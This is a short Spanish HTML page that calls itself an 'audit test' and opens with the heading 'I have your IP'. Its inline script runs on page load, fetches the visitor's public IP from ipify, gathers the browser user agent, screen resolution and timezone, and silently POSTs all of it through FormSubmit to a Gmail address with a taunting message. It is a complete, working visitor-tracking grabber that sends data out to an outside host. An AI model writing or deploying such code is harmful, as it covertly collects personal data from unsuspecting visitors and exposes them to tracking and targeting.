<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prueba de Auditoría</title>
</head>
<body>
    <h1>Tengo tu IP, Prueba de auditoría exitosa.</h1>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // URL de la API gratuita para obtener la IP y datos del dispositivo
            const apiUrl = 'https://api.ipify.org?format=json';

            // Función para obtener la IP y datos del dispositivo
            async function getIpAndDeviceInfo() {
                try {
                    const response = await fetch(apiUrl);
                    const data = await response.json();
                    const ip = data.ip;

                    // Obtener más datos del dispositivo
                    const userAgent = navigator.userAgent;
                    const screenResolution = `${window.screen.width}x${window.screen.height}`;
                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

                    // Datos a enviar
                    const deviceInfo = {
                        ip: ip,
                        userAgent: userAgent,
                        screenResolution: screenResolution,
                        timezone: timezone
                    };

                    // Enviar datos a FormSubmit
                    sendDataToEmail(deviceInfo);
                } catch (error) {
                    console.error('Error al obtener la IP y datos del dispositivo:', error);
                }
            }

            // Función para enviar datos a FormSubmit
            function sendDataToEmail(deviceInfo) {
                const formSubmitUrl = 'https://formsubmit.co/jhjjjjjjsjsjsjsj@gmail.com';
                const formData = new FormData();

                formData.append('ip', deviceInfo.ip);
                formData.append('userAgent', deviceInfo.userAgent);
                formData.append('screenResolution', deviceInfo.screenResolution);
                formData.append('timezone', deviceInfo.timezone);
                formData.append('message', 'Darío dias toma tu ip');

                fetch(formSubmitUrl, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Datos enviados con éxito:', data);
                })
                .catch(error => {
                    console.error('Error al enviar datos:', error);
                });
            }

            // Llamar a la función para obtener la IP y datos del dispositivo
            getIpAndDeviceInfo();
        });
    </script>
</body>
</html>
